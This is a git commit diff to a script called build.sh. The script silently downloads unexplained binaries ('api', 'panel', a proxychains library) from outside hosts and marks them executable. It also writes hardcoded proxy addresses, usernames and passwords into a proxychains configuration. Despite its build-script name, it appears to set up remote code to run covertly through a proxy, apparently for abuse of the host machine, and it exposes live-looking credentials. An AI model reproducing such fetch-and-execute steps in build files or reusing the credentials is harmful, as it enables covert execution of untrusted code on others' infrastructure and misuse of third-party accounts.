2ad28b131c449cfb130bac582eabc5fac900a81e
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-15 19:54:38 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,12 +1,12 @@
-proxy="50.17.160.202" 
-port="9293" 
-user="73b065yffz7ymg"  
-pass="rzudmq10wr15mn0je4pczgjen9equ" 
+proxy="54.173.229.200" 
+port="80" 
+user="fixie"  
+pass="Qrj3UKEc6UHpknH" 
 wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json >/dev/null 2>&1
-wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel >/dev/null 2>&1
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
-wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so >/dev/null 2>&1
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
 sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
 sleep 1 
@@ -15,7 +15,7 @@ sed -i "s/user/$user/" "proxychains.conf"
 sleep 1  
 sed -i "s/pass/$pass/" "proxychains.conf" 
 sleep 11 
-echo "******************************************************************" 
+echo "**********************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " " 
 echo " " 
